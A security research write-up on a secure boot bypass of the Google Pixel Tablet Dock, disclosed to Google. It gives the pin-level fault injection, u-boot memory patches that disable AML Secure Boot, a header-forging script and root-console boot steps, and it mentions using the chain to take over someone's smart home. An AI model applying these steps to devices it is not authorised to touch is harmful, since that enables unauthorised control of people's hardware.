---
layout: post
title: Pixel Tablet Dock (korlan) Secure Boot Bypass
---

## #HARDPWN-NL-2023 - [korlan-secure-boot-bypass](https://github.com/oddsolutions/korlan-secure-boot-bypass/)

A chain of two exploits intended to allow one to run a custom OS/unsigned code on the Google Pixel Tablet Dock (korlan).

Security researchers Nolen Johnson (npjohnson) and Jan Altensen (Stricted) developed this chain of vulnerabilities as a group effort.

The injection vector, as well as the ability to bypass AMLogic (AML) Secure Boot seem to affect multiple other Nest devices.

# Standard Disclaimer

You are solely responsible for any potential damage(s) caused to your device by this exploit.

# Whitepaper

## Background

Jan and I previously bypassed secure boot on the Chromecast with Google TV 4K (sabrina) and the Chromecast with Google TV 1080P (boreal) in 2021 and 2023 respectively.

After the boreal vulnerabilities were submitted and triaged, Google's VRP team offered to sponsor Jan and I to attend [hardwear.io](https://hardwear.io) 2023 in The Hauge, Netherlands to attend and participate in the [HardPWN](https://hardwear.io/netherlands-2023/hardpwn.php) competition!

HardPWN is an amazing competition where sponsoring OEM's (Original Equipment Manufacturer) provides devices to hardware researchers who spend the entire week in a caffeine fueled haze hacking away at them. They also often have developer staff present to help answer researcher questions and triage issues live.

We chose the Pixel Tablet Dock, as it seemed very complex for what it ultimately does. We were also very curious about what attack vectors were feasible on it.

Google provided us with several Docks (and their accompanying Pixel Tablets!), kernel/modules/u-boot source code, firmware packages, and access to developers who worked on the development of the Pixel Tablet Dock.

This product is super fun, as it was clearly originally built to do _so much more_ than what it ended up being capable of in production. Ultimately, the scope of the project was reduced to the point that all it does is:

- Play music through a speaker over USB Protobuf communication
- Houses a device-ID that the Pixel Tablet recognizes to put the tablet into "Hub Mode", which exposes smart home controls without lock-screen authentication (which is fun!)
- Charge the Pixel Tablet

## A familiar (but notably different) injection vector

Firstly, we need an access venue to u-boot, or a similarly privileged injection vector.

UART was easy to identify, and this device utilizes an AML A113D chipset, which uses the standard AML G12 SoC baud rate of `115200`.

Unfortunately, Google has hardened both useful access venues UART offered previously:

- u-boot's `CONFIG_AUTOBOOT_DELAY` is set to `-2`, which _should_ prevent us from interrupting the boot sequence to access a u-boot shell over serial (more on that later...) 
- Android's console service is not started, and we have no privileged venue from which to start it, so we can't access an Android shell over serial either

Good news, we had been around this block before on boreal, but this was a NAND device, not an eMMC device, so we knew that the injection vector would likely look different.

After some hours of mapping out pins with a logic analyzer, and blindly probing, we discovered by shorting `SCK` (effectively interrupting the NAND Clock configuration) at the right time, the device would drop us into a u-boot shell.

Specifically, `SCK` should be shorted once for roughly two seconds right after the following message:

```shell
scanning usb for storage devices... 0 Storage Device(s) found
       scanning bus 0 for devices... 1 USB Device(s) found
```

We sometimes saw the UART message `NEVER BE HERE` come out of BL2. This is both comical, and implies that we were shorting the pin too soon (likely due to the mass amounts of caffeine in our systems),

A significant delay follows this message before the boot process proceeds, so the timing is much more reliable than the fault injection method we reported previously on boreal utilizing the `D5` eMMC line. However, unlike boreal, due to differences in how NAND is initialized versus eMMC, the NAND device was not detected and appeared to be in a non-recoverable state after performing this fault injection.

We then worked to find a way to maintain NAND functionality after performing the glitch, ultimately finding that by holding the Chipselect (CS#) to high at the same message shown above, we could reliably get the device to glitch and fall back to u-boot shell, while keeping the NAND alive, and in a state in which we can interact with it.

A pinout of the board and docking daughterboard can be seen below:

<img src="https://i.imgur.com/fUX1lXQ.png" style="zoom: 67%;" />

After we got reliable u-boot shell access, we checked if the `env` partition could be persistently edited, and much like on boreal, it could not, as u-boot appeared to reset it every boot.

We initially thought that the device would be reasonably easy to unlock from here - little did we know what was in store for us.

## Oh wow, there is no Android Verified Boot

Upon further inspection, the device runs CastOS, which is Google's smart-things/IoT OS.

We then looked for the typical markers identifying a device that implements Android Verified Boot but found almost no signs of it. There was no DM or FS Verity and no Android-style boot image verification.

This briefly confused us until we tried to dump the boot image from the NAND into memory utilizing u-boot and got unintelligible, encrypted data with a weirdly formatted header.

## AML Secure Boot versus Android Verified Boot

As it turns out, Google commonly doesn't utilize AVB on AML-based smart-things/IoT devices. Rather, they often rely on vendor-provided conventions; in this case, AML Secure Boot.

AVB largely relies on certificate/signature-based chain-of-trust, whereas AML Secure Boot relies far more on encryption/decryption as the integrity check.

Instead of checking if the images are signed, it instead checks if the stored key is capable of decrypting the image. If it is decryptable, it must be valid, as the key utilized to encrypt it is private. If it does not successfully decrypt, it must not be valid.

AML Secure Boot is enforced by the BootROM on BL2, then subsequently by BL2 on BL33 (u-boot), and finally by BL33 on the boot image.

## Extracting unencrypted firmware image

At this point we needed a static copy of BL33 (u-boot), the boot image, and ideally the recovery image, but dumping these from the NAND proved useless, as AML secure-boot ensures they are encrypted.

Google provided us a full [OTA Image](https://github.com/oddsolutions/korlan-secure-boot-bypass/tree/main/korlan-user_386727_ota_korlan-b4_stable-channel_386727) and a [Factory Image](https://github.com/oddsolutions/korlan-secure-boot-bypass/tree/main/korlan-user_386727_factory-images_korlan-b4_stable-channel_386727), but `u-boot.bin` (OTA image) `bl2.img` (Factory Image), `boot.img`, and `recovery.img` are all encrypted, as is evident by their AML Secure Boot headers.

We then began blindly dumping memory using `md.b 0x50000`, and at 0x0, we immediately recognized a u-boot header. We then dumped the entirety of u-boot using `md.b`, saved the serial console capture, stripped it to just contain the `md.b` output, and used [uboot-mdb-dump](https://github.com/gmbnomis/uboot-mdb-dump) to reassemble it on the attached host device.

At this point, we were presented with a conundrum: u-boot would only decrypt the boot/recovery images when the device was typically booted via the `bootm` command. But by running `bootm` we would execute the kernel and become unable to dump the loaded boot image from memory.

So, we opted to drop the extracted u-boot into IDA Pro and calculate the offsets of the functions that make `bootm` actually boot Linux after loading and `NOP` them out, effectively making `bootm` exit and not reset upon failing to boot the kernel

```shell
# Make `bootm` `return 0;` unconditionally right before the Linux kernel would be executed
mw 0x4e2c 1400002a
# Allow us to interrupt the next warm-reset of u-boot
setenv bootdelay 3
# Ensure the bootdelay change takes effect
saveenv
```

After patching u-boot, we then jump to u-boot's base address to effectively warm-reset u-boot with our modifications by running:

```shell
go 0x0
```

Then, because we set the `bootdelay` variable above, we were able to interrupt boot at u-boot, and ran the following to mock-load the boot and recovery images, then dump them:

```shell
imgread kernel recovery 0x01080000
md.b 0x01080000 500
bootm 0x01080000
```

Awesome, so now we have extracted `u-boot`, `recovery`, and `boot` images.

## Creating a malicious boot image

Next, we extracted the unencrypted boot image by utilizing [unpack_bootimg.py](https://android.googlesource.com/platform/system/tools/mkbootimg/+/135c68bdd32ac1bbc4ec4ccb7881e2184d92c890/unpack_bootimg.py?pli=1#), extracting the ramdisk, adding a prebuilt armeabi-v7a busybox binary (such as [this one](https://github.com/oddsolutions/korlan-secure-boot-bypass/raw/main/tools/busybox) and patching the contained `init.rc` file to contain the following service declaration:

```shell
service console /sbin/busybox sh
    console
    user root
```

We also appended `start console` right after the `on fs` trigger.

Then we repack the ramdisk, and use [mkbootimg](https://android.googlesource.com/platform/system/tools/mkbootimg) to repack the boot image utilizing the data spit out earlier by the `unpack_bootimg.py` python script.

Now, even with the boot image edited and persistent access to u-boot shell, AML Secure Boot is still enforced... or at least it is for now.

## Memory patching and forging a header or two

So, further static analysis of u-boot in IDA Pro led us to being able to discern how to effectively neuter AML Secure Boot:

```shell
# https://nest-open-source.googlesource.com/manifest_repos/u-boot/+/32f2544bf313f8ca4c6026c2ea8bbba41057be35/cmd/bootm.c#176
# replace aml_sec_boot_check with a NOP, will cause "nRet" to be not zero
# ```
#  else {
#    iVar7 = 0x51;
#  }
#  if (iVar7 != 0) {
# ```
mw 0x4e28 d503201f

# https://nest-open-source.googlesource.com/manifest_repos/u-boot/+/32f2544bf313f8ca4c6026c2ea8bbba41057be35/cmd/bootm.c#228
# - if (nRet) { while (1); }
# + if (!nRet) { while (1); }
mw 0x4e2c 35000120

# Warm-Reset u-boot again
go 0x0
```

This disables the necessity to have _valid_ AML Secure Boot headers on our boot image, but still expects that they have a "proper looking" header.

To satiate that, we first we wrote a script to recreate all of the AML Secure Boot header, except for one key functions:

- The digest, as it is unecessary after our patches above, and useless for us to generate an invalid one.

```shell
#!/bin/bash
# header.sh

append_uint32_le() {
    local input=$1
    local output=$2
    local v=
    local vrev=
    v=$(printf %08x $input)
    # 00010001
    vrev=${v:6:2}${v:4:2}${v:2:2}${v:0:2}
    echo $vrev | xxd -r -p >> $output
}
pad_file() {
    local file=$1
    local len=$2
    if [ ! -f "$1" ] || [ -z "$2" ]; then
        echo "Argument error, \"$1\", \"$2\" "
        exit 1
    fi
    local filesize=$(wc -c < ${file})
    local padlen=$(( $len - $filesize ))
    if [ $len -lt $filesize ]; then
        echo "File larger than expected.  $filesize, $len"
        exit 1
    fi
    dd if=/dev/zero of=$file oflag=append conv=notrunc bs=1 \
        count=$padlen >& /dev/null
}
echo -n '@AML1'
imagesize=$(stat --printf="%s" boot_test.img)
echo -n '@AML2'
remd=$(( $imagesize % 512 ))
echo -n '@AML3'

input=boot_test.img
if [ $remd -ne 0 ]; then
echo -n '@AML4'
    #echo "Input $input not 512 byte aligned?"
    topad=$(( 512 - $rem ))
    imagesize=$(( $imagesize + $topad ))
    cp boot_test.img kernpad.bin
    pad_file kernpad.bin $imagesize
    input=kernpad.bin
fi
echo -n '@AML5'
openssl dgst -sha256 -binary $input > kern-pl.sha
echo -n '@AML6'
echo -n '@AML' > kern.hdr
append_uint32_le 4 kern.hdr
append_uint32_le 0 kern.hdr
append_uint32_le 0 kern.hdr
# img_size, img_offset, img_hash, reserved
append_uint32_le $imagesize kern.hdr
append_uint32_le 512 kern.hdr
cat kern-pl.sha >> kern.hdr
pad_file kern.hdr 256

#openssl dgst -sha256 -out kern.hdr.sig kern.hdr

#cat kern.hdr.sig >> kern.hdr

pad_file kern.hdr 512
```

At this point, we are ready to prepend our newly generated AML Secure Boot header and recreate our boot image.

```shell
#!/bin/bash
# mk_boot.sh

cat kern.hdr boot_test.img > boot.tmp

imagesize=$(stat --printf="%s" boot.tmp)
paddingsize=$(( 12582912 - $imagesize ))
dd if=/dev/zero ibs=1 count=$paddingsize | LC_ALL=C tr "\000" "\377" >padding_boot.bin

cat bootloader.bin junk.bin tpl.bin fts.bin factory.bin recovery.bin boot.tmp padding_boot.bin system.bin cache.bin > nand_test.bin
```

Now, we're ready to actually install this boot image to the device, but, how to go about it?

## Getting something onto the device

Originally, we tried to execute `fastboot` from within u-boot, but we couldn't get reliable communications on either `USB0` or `USB1`. Given the tight timeline of the competition, we went the nuclear route and desoldered the NAND, dropping it into a NAND flash reader, and then wrote it by hand. Post-competition we ultimately ended up adapting a method similar to what we did on boreal.

We hooked up a powered USB hub to the `USB0` bus, with a FAT32 drive attached that had our modified boot image on the filesystem. We then `fatload` to pull the modified boot image from the USB into ram (`loadaddr`), and then utilized `store` to write it to the `boot` partition.

## Booting afformentioned malicious boot image

Once we have the malicious boot image installed and in place, we can then perform the fault-injection one final time, and then re-run the AML Secure Boot disable memory edit commands and re-execute u-boot:

```shell
mw 0x4e28 d503201f # Patch AML Secure Boot [1/2]
mw 0x4e2c 35000120 # Patch AML Secure Boot [2/2]
# Allow us to interrupt the next warm-reset of u-boot
setenv bootdelay 3
# Ensure the bootdelay change takes effect
saveenv
# Warm-Reset u-boot again
go 0x0
```

At this point the device will fully boot with a root console presented!

## Plugging it all together

Here is a serial capture of the full chain plugged together after writing the modified boot image to the NAND:

```shell
TE: 29736

100bdlr_step_size ps== 475
BL31:tsensor calibration: 0xc6000043

detect upgrade key not pressed
FTS read: usb_controller_type -> 
mtd_store_read 564 mtd read err, ret -110
Err imgread(L437):Fail to read 0x100000B from part[boot] at offset 0
try upgrade as booting failure
GPIOH_6: not found
PHY2=0xfe004420
noSof
sof timeout, reset usb phy tuning
starting USB...
USB0:   GPIOH_6: not found
Register 1000140 NbrPorts 1
Starting the controller
USB XHCI 1.00
scanning bus 0 for devices... 1 USB Device(s) found
       scanning usb for storage devices... 0 Storage Device(s) found

korlan_bx# mw 0x30edc d503201f
korlan_bx# go 0x0

## Starting application
detect upgrade key not pressed
FTS read: usb_controller_type -> 
mtd_store_read 564 mtd read err, ret -110
Err imgread(L508):Fail to read 0x644a00B from part[boot] at offset 0x100000
try upgrade as booting failure
GPIOH_6: not found
PHY2=0xfe004420
noSof
sof timeout, reset usb phy tuning
starting USB...
USB0:   GPIOH_6: not found
Register 1000140 NbrPorts 1
Starting the controller
USB XHCI 1.00
scanning bus 0 for devices... 1 USB Device(s) found
       scanning usb for storage devices... 0 Storage Device(s) found

korlan_bx# setenv bootargs console=ttyS0,115200 earlycon=aml-uart,0xfe002000 rootfstype=ramfs init=/init no_console_suspend quiet loglevel=7 ramoops.pstore_en=1 ramoops.record_size=0x8000 ramoops.console_size=0x4000 selinux=1 enforcing=0 nousb nooverlayfs ${bootargs}
korlan_bx# boot

[    0.000000@0] Booting Linux on physical CPU 0x0000000000 [0x410fd042]
[    0.000000@0] Linux version 4.19.219-g7ef11940e2f9 (user@host) (Chromium OS 14.0_pre445002_p20220217-r12 clang version 14.0.0 (/var/tmp/portage/sys-devel/llvm-14.0_pre445002_p20220217-r12/work/llvm-14.0_pre445002_p20220217/clang 18308e171b5b1dd99627a4d88c7d6c5ff21b8c96)) #0 SMP PREEMPT Mon Oct 31 15:27:49 2022 (7ef11940)
[    0.000000@0] Machine model: Google Korlan B4 Board
[    0.000000@0] earlycon: aml-uart0 at MMIO 0x00000000fe002000 (options '')
[    0.000000@0] bootconsole [aml-uart0] enabled
[    0.000000@0] 	03d00000 - 04000000,     3072 KB, linux,secos
[    0.000000@0] 	07400000 - 07500000,     1024 KB, ramoops@0x07400000
...
[    4.441941@1] UBIFS (ubi7:0): media format: w5/r0 (latest is w5/r0), UUID 9BC54E28-D6AE-4B54-94F4-8B2496355FA6, small LPT model
ubi7:cache /cache ubifs rw,nosuid,nodev,noexec,noatime,assert=read-only,ubi=7,vol=0 0 0
/cache is already mounted
Could not get context of /cache/recovery:  No data available
SELinux is disabled.
ifconfig: ioctl 8913: No such device
Update boot id is running.
Initializing random number generator...
console#
```

Take note that we also edited the `bootargs` to make the Linux kernel a bit more chattier over UART, but you could just as well let the device boot up after running `go 0x0`.

At this point you have full root access to the booted CastOS image!

On boot, you'll need to perform the fault injection on the `CS#` pin and patch the AML Secure Boot checks to continue boot, as AML Secure Boot still hasn't been persistently bypassed (yet... stay tuned... maybe)

## Where to go from here? What can we do?

At this point, you have tethered local root access to the Pixel Tablet Dock, and can change out the CastOS firmware image for another OS, rebuild and modify the kernel, etc.

You can also utilize this chain to clone someone's dock, and then utilize Hub Mode on their Pixel Tablet to control their smart home devices without authentication.

This device also has two USB buses that can be used for whatever you please. They're annotated in the pin-out shown earlier.

If you want to boot an AML formatted USB boot image with a powered hub connected to USB0, you can run:

```shell
mw 0x4e30 d503201f # Patch USB image checks out
setenv bootdelay 3
saveenv
go 0x0
[Interrupt u-boot via UART]
run recovery_from_udisk
```

Note: We were unable to get fastboot working over these USB ports. Man, that would have made injection of the boot image easier! Reach out if you're able to do so!

You can also remove the DM-Verity checks on the `system` partition by removing the only entry in `dmtable` in the ramdisk.

It also might be fun to see if anyone could get [Fuscia](https://fuchsia.dev/fuchsia-src/get-started/get_fuchsia_source) booting on this board! Please reach out to us if you are able to do anything fun with this exploit chain - we'd love to hear about your adventures and chat about Product Security.

A collection of all our knowledge on this deivce, as well as resources to utilize this chain of exploits can be found [here](https://github.com/oddsolutions/korlan-secure-boot-bypass/).

# Disclosure Timeline

- 02-NOV-2023 - Initial report sent to Google.
- 14-DEC-2023 - Additional details disclosed, with full POC.
- 24-JAN-2024 - We notified Google that we would be demoing part of this exploit-chain at NullCon Berlin 2024 in a talk entitled "Fault Injection and the Supply Chain".
- 31-JAN-2024 - Google says they've "completed a fix for the vulnerability and it's in the testing phase" and announces that it was rated a "Moderate" vulnerability and was rewarded $500.
- 06-MAR-2024 - We provided a reminder about the NullCon talk, and asked for the ticket to be re-reviewed.
- 08-MAR-2024 - Google announces that a CVE identifier will be assigned, and that the ticket was split up. Additionally, the following snippet was provided:

"Our team has thoroughly reviewed your report and confirmed that the reported vulnerability utilizes a previously reported exploit. In addition, this vulnerability doesn’t expose high-value assets nor pose a significant risk due to the limitations of a physical attack."

- We have a few issues with this statement:

  * We disagree with the nature of the chain of vulnerabillities being designated as `a previously reported exploit`. This is not eMMC fault injection in u-boot by shorting an eMMC data-line pin, like as we reported on boreal.

    This is distinct, it is still a type of fault injection, but is performed by pulling the Chip-select (CS#) pin to high utilizing the VCC pin at a strategic time, which allows the user to gain u-boot shell.

  - We only selected this asset as it was provided as a target for the HardPWN competition. To deem a flagship target of the competition as a non-high-value asset, and then rate hardware-based attacks lower is somewhat confusing.

**Ultimately we respect the decisions, and are very grateful that Google supported our research of their devices and sponsored us to attend this wonderful conference. We look forward to working on Google devices in the future but do hope that expectations and that the ratings and criticality matrixes is more clearly defined in the future.**

- 11-APR-2024 - We ask for a follow-up, and receive a response that work is still in progress.
- 16-MAY-2024 - We ask for a follow-up, and receive a response that work is still in progress.
- 21-MAY-2024 - We follow up stating that we plan to release the writeup and resources on 30-JUN-2024, as the vulnerability had supassed the original disclosure timeline. We received a response that the issue still being a work in progress.
- 11-JUN-2024 - We sent a reminder of the upcoming release date and asked for updates regarding the CVE identifiers.
- 12-JUN-2024 - Google states that their remediation timeline has slipped and will now push into Q3.
- 20-JUN-2024 - We share the proposed writeup with Google.
- TBA - The vulnerability patch was deployed via an OTA update delivered through the Pixel Tablet.

## CVE Tracking

[CVE-2024-TBA]() - NAND Fault Injection

# Credits

- Nolen Johnson (npjohnson), Jan Altensen (Stricted): Theorizing, developing, and chaining together these vulnerabilities into an exploit chain.

# Special Thanks

- Angelina Sosa and the VRP team: The opportunity  to work on Google hardware, sponsorship to attend the Hardwear.io conference, and the awesome events at the conference. We greatly appreciate the team, the opportunities they provide us, and look forward to working with them in the future.
- Dennis Giese - Per our agreement, he provided specialized (super awesome) breakout boards, and I am now obliged to refer to him as the "greatest person of all time, ever"
- tihmstar - Helping us figure out some u-boot memory patching issues, then burning out our first korlan board and silently walking away lol

# Contribute to FOSS development on this device

- Manifest: https://nest-open-source.googlesource.com/manifests/+/refs/heads/main/pixel_tablet_speaker_dock/
